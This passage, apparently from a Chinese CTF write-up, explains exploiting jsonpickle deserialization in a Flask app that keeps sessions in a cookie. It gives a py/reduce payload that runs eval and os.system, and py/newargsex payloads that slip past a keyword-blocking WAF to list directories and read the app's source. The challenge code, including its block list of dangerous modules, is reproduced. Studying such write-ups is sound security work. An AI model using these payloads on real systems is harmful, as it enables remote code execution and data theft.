operator">&gt;</span>            <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>button <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span><span class="token operator">&gt;</span>注册<span class="token operator">&lt;</span>/button<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>/form<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"nav"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token operator">&gt;</span>返回登录<span class="token operator">&lt;</span>/a<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>POST /register HTTP/1.1Host: nepctf32-bwvp-6lno-xsqe-fdssm7sec647.nepctf.comConnection: closeContent-Type: application/x-www-form-urlencoded  Content-Length: <span class="token number">38</span>  <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span><span class="token assign-left variable">confirm_password</span><span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/news/16133">从源码看JsonPickle反序列化利用与绕WAF-先知社区</a></p><p><a href="https://xz.aliyun.com/news/16019">S8强网杯 ez_login详解-先知社区</a></p><p><a href="https://www.cnblogs.com/CourserLi/p/16655437.html">关于 JSON 引号问题 - 筱团 - 博客园</a></p><pre class="line-numbers language-none"><code class="language-none">{"py/object": "__main__.Session", "meta": {"user": "admin", "ts": 1753690230}}eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogImFkbWluIiwgInRzIjogMTc1MzY5MDIzMH19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">    <span class="token triple-quoted-string string">"""Returns an instance of the object from the object's repr() string.    It involves the dynamic specification of code.    .. warning::        This function is unsafe and uses `eval()`.    &gt;&gt;&gt; obj = loadrepr('datetime/datetime.datetime.now()')    &gt;&gt;&gt; obj.__class__.__name__    'datetime'    """</span>    module<span class="token punctuation">,</span> evalstr <span class="token operator">=</span> reprstr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    mylocals <span class="token operator">=</span> <span class="token builtin">locals</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    localname <span class="token operator">=</span> module    <span class="token keyword">if</span> <span class="token string">'.'</span> <span class="token keyword">in</span> localname<span class="token punctuation">:</span>        localname <span class="token operator">=</span> module<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    mylocals<span class="token punctuation">[</span>localname<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>evalstr<span class="token punctuation">,</span> mylocals<span class="token punctuation">)</span><span class="token comment">#eval(evalstr, mylocals)：在mylocals指定的局部命名空间中，执行evalstr字符串中的表达式。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_restore_reduce</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Supports restoring with all elements of __reduce__ as per pep 307.        Assumes that iterator items (the last two) are represented as lists        as per pickler implementation.        """</span>        reduce_val <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_restore<span class="token punctuation">,</span> obj<span class="token punctuation">[</span>tags<span class="token punctuation">.</span>REDUCE<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>reduce_val<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>            reduce_val<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>reduce_val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">,</span> args<span class="token punctuation">,</span> state<span class="token punctuation">,</span> listitems<span class="token punctuation">,</span> dictitems <span class="token operator">=</span> reduce_val        <span class="token keyword">if</span> f <span class="token operator">==</span> tags<span class="token punctuation">.</span>NEWOBJ <span class="token keyword">or</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'__newobj__'</span><span class="token punctuation">:</span>            cls <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                cls <span class="token operator">=</span> self<span class="token punctuation">.</span>_restore<span class="token punctuation">(</span>cls<span class="token punctuation">)</span>            stage1 <span class="token operator">=</span> cls<span class="token punctuation">.</span>__new__<span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            stage1 <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>        <span class="token keyword">if</span> state<span class="token punctuation">:</span> <span class="token keyword">pass</span>        <span class="token keyword">if</span> listitems<span class="token punctuation">:</span> <span class="token keyword">pass</span>        <span class="token keyword">if</span> dictitems<span class="token punctuation">:</span> <span class="token keyword">pass</span>        <span class="token keyword">return</span> stage1可以构造如下payload<span class="token punctuation">{</span><span class="token string">'py/reduce'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">'py/function'</span><span class="token punctuation">:</span> <span class="token string">'builtins.eval'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'py/tuple'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"__import__('os').system('calc')"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token comment">#代码逻辑分析：</span><span class="token comment">#该方法处理__reduce__返回的值，用于重建对象</span><span class="token comment">#reduce_val通过self._restore处理后得到一个包含 5 个元素的列表</span><span class="token comment">#其中第一个元素f被当作函数，第二个元素args被当作参数</span><span class="token comment">#关键执行点：stage1 = f(*args)，这会调用函数f并传入参数args</span><span class="token comment">#payload 工作原理：</span><span class="token comment">#你的 payload{'py/reduce': [{'py/function': 'builtins.eval'}, {'py/tuple': #["__import__('os').system('calc')"]}]}正好提供了f和args</span><span class="token comment">#当这段代码处理该 payload 时，f会被解析为builtins.eval函数</span><span class="token comment">#args会被解析为包含字符串"__import__('os').system('calc')"的元组</span><span class="token comment">#最终执行eval("__import__('os').system('calc')")，这会导入 os 模块并执行系统命令打开计算器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>py/repr的tag可以直接进exec来RCE，但这必须要decoder的safe模式是关闭的才行，这个模式v3是默认关的，v4就默认开了。不信可以去看开发文档。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">- `py/newargs`只包含位置参数（一个列表或元组）- `py/newargsex`包含位置参数和关键字参数（一个元组，第一个元素是位置参数列表，第二个元素是关键字参数字典）于是可以直接改：{"py/object": "__main__.Session", "meta": {"user":{"py/object": "glob.glob", "py/newargs": {"/*"}},"ts":1753446254}}{"py/object": "__main__.Session", "meta": {"user":{"py/object": "glob.glob","py/newargsex":[["/*"],{}]},"ts":1753446254}}['/run', '/bin', '/usr', '/etc', '/mnt', '/home', '/var', '/srv', '/sys', '/proc', '/sbin', '/lib64', '/media', '/opt', '/lib', '/dev', '/tmp', '/boot', '/root', '/flag', '/entrypoint.sh', '/readflag', '/app']<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"py/object"</span><span class="token punctuation">:</span> <span class="token string">"__main__.Session"</span><span class="token punctuation">,</span> <span class="token string">"meta"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"user"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"py/object"</span><span class="token punctuation">:</span> <span class="token string">"linecache.getlines"</span><span class="token punctuation">,</span><span class="token string">"py/newargsex"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"/app/app.py"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"ts"</span><span class="token punctuation">:</span><span class="token number">1753446254</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token keyword">import</span> jsonpickle<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> json<span class="token punctuation">,</span> os<span class="token punctuation">,</span> timeapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Account</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> uid<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>uid<span class="token punctuation">,</span> self<span class="token punctuation">.</span>pwd <span class="token operator">=</span> uid<span class="token punctuation">,</span> pwd<span class="token keyword">class</span> <span class="token class-name">Session</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> meta<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>meta <span class="token operator">=</span> metausers_db <span class="token operator">=</span> <span class="token punctuation">[</span>Account<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Account<span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">register_user</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>acc<span class="token punctuation">.</span>uid <span class="token operator">==</span> username <span class="token keyword">for</span> acc <span class="token keyword">in</span> users_db<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    users_db<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Account<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span>FORBIDDEN <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">,</span> <span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'Popen'</span><span class="token punctuation">,</span> <span class="token string">'nt'</span><span class="token punctuation">,</span>    <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'reduce'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'command'</span><span class="token punctuation">,</span> <span class="token string">'pty'</span><span class="token punctuation">,</span> <span class="token string">'platform'</span><span class="token punctuation">,</span> <span class="token string">'pdb'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">,</span> <span class="token string">'marshal'</span><span class="token punctuation">,</span>    <span class="token string">'socket'</span><span class="token punctuation">,</span> <span class="token string">'threading'</span><span class="token punctuation">,</span> <span class="token string">'multiprocessing'</span><span class="token punctuation">,</span> <span class="token string">'signal'</span><span class="token punctuation">,</span> <span class="token string">'traceback'</span><span class="token punctuation">,</span> <span class="token string">'inspect'</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">,</span> <span class="token string">'posix'</span><span class="token punctuation">,</span>    <span class="token string">'render_template'</span><span class="token punctuation">,</span> <span class="token string">'jsonpickle'</span><span class="token punctuation">,</span> <span class="token string">'cgi'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'shutil'</span><span class="token punctuation">,</span> <span class="token string">'state'</span><span class="token punctuation">,</span>    <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'ctypes'</span><span class="token punctuation">,</span> <span class="token string">'timeit'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'codecs'</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">,</span> <span class="token string">'jinja2'</span><span class="token punctuation">,</span> <span class="token string">'re'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span>    <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">,</span> <span class="token string">'locals'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">,</span> <span class="token string">'delattr'</span><span class="token punctuation">,</span> <span class="token string">'uuid'</span><span class="token punctuation">,</span>    <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'__globals__'</span><span class="token punctuation">,</span> <span class="token string">'__code__'</span><span class="token punctuation">,</span> <span class="token string">'__closure__'</span><span class="token punctuation">,</span> <span class="token string">'__func__'</span><span class="token punctuation">,</span> <span class="token string">'__self__'</span><span class="token punctuation">,</span> <span class="token string">'pydoc'</span><span class="token punctuation">,</span>    <span class="token string">'__module__'</span><span class="token punctuation">,</span> <span class="token string">'__dict__'</span><span class="token punctuation">,</span> <span class="token string">'__mro__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasses__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bad <span class="token keyword">for</span> bad <span class="token keyword">in</span> FORBIDDEN <span class="token keyword">if</span> bad <span class="token keyword">in</span> payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">root</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        u<span class="token punctuation">,</span> p<span class="token punctuation">,</span> cp <span class="token operator">=</span> <span class="token punctuation">[</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">'confirm_password'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>u<span class="token punctuation">,</span> p<span class="token punctuation">,</span> cp<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"所有字段都是必填的。"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> p <span class="token operator">!=</span> cp<span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"密码不匹配。"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"用户名至少4字符，密码至少6字符。"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> register_user<span class="token punctuation">(</span>u<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"注册成功！请登录。"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"用户名已存在。"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/auth'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u<span class="token punctuation">,</span> p <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"u"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> acc <span class="token keyword">in</span> users_db<span class="token punctuation">:</span>        <span class="token keyword">if</span> acc<span class="token punctuation">.</span>uid <span class="token operator">==</span> u <span class="token keyword">and</span> acc<span class="token punctuation">.</span>pwd <span class="token operator">==</span> p<span class="token punctuation">:</span>            sess <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span> u<span class="token punctuation">,</span> <span class="token string">'ts'</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>            token <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>jsonpickle<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>sess<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"登录成功。"</span><span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"authz"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'Location'</span><span class="token punctuation">:</span> <span class="token string">'/panel'</span><span class="token punctuation">,</span> <span class="token string">'Status'</span><span class="token punctuation">:</span> <span class="token string">'302'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> resp    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"登录失败。用户名或密码无效。"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/panel'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">panel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"authz"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"缺少Token。"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'error.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Token格式错误。"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ban <span class="token operator">:=</span> waf<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'error.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"请不要黑客攻击！</span><span class="token interpolation"><span class="token punctuation">{</span>ban<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sess <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>decoded<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_panel.html'</span> <span class="token keyword">if</span> sess<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">'user_panel.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>sess<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'error.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"数据解码失败。"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/vault'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"authz"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'error.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"请不要尝试黑客攻击！"</span><span class="token punctuation">)</span>        sess <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>decoded<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> sess<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> 